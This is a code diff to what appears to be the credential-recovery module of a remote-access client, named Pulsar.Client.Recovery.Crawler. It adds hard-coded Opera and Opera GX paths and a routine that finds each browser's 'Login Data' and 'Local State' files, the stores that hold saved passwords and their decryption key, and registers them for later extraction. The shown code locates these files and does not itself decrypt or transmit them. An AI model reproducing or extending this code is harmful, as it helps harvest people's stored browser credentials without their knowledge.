@@ -9,13 +9,22 @@ namespace Pulsar.Client.Recovery.Crawler
 {
     public class Crawl
     {
+        private static readonly string[] knownBrowserPaths = {
+                @"Opera",
+                @"Opera Software\Opera GX Stable",
+            };
+
+        private static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        private static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        private static List<BrowserChromium> foundChromiumBrowsers = new List<BrowserChromium>();
+        private static List<BrowserGecko> foundGeckoBrowsers = new List<BrowserGecko>();
+
         public static List<AllBrowsers> Start()
         {
-            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            foundChromiumBrowsers.Clear();
+            foundGeckoBrowsers.Clear();
+
             string[] rootDirs = { localAppData, appData };
-            List<BrowserChromium> foundChromiumBrowsers = new List<BrowserChromium>();
-            List<BrowserGecko> foundGeckoBrowsers = new List<BrowserGecko>();
 
             Parallel.ForEach(rootDirs, rootDir =>
             {
@@ -24,6 +33,8 @@ namespace Pulsar.Client.Recovery.Crawler
                     SearchDirectory(rootDir, foundChromiumBrowsers, foundGeckoBrowsers, rootDir == appData);
                 }
             });
+
+            CheckForKnownBrowsers();
 
             return new List<AllBrowsers>
             {
@@ -140,6 +151,60 @@ namespace Pulsar.Client.Recovery.Crawler
                                 });
                             }
                         }
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                return;
+            }
+        }
+
+        private static void CheckForKnownBrowsers()
+        {
+            foreach (var knownPath in knownBrowserPaths)
+            {
+                string fullPath = Path.Combine(appData, knownPath);
+                if (Directory.Exists(fullPath))
+                {
+                    if (knownPath.Contains("Opera"))
+                    {
+                        CheckForOperaBrowser(fullPath);
+                    }
+                    else
+                    {
+                        CheckForBrowser(fullPath, foundChromiumBrowsers, foundGeckoBrowsers, false);
+                    }
+                }
+            }
+        }
+
+        private static void CheckForOperaBrowser(string path)
+        {
+            try
+            {
+                string loginDataPath = Path.Combine(path, "Login Data");
+                if (File.Exists(loginDataPath))
+                {
+                    var profiles = new List<ProfileChromium>
+                    {
+                        new ProfileChromium
+                        {
+                            Name = "Default",
+                            LoginData = loginDataPath,
+                            Path = path
+                        }
+                    };
+
+                    lock (foundChromiumBrowsers)
+                    {
+                        foundChromiumBrowsers.Add(new BrowserChromium
+                        {
+                            Name = "Opera",
+                            LocalState = Path.Combine(path, "Local State"),
+                            Path = path,
+                            Profiles = profiles.ToArray()
+                        });
                     }
                 }
             }
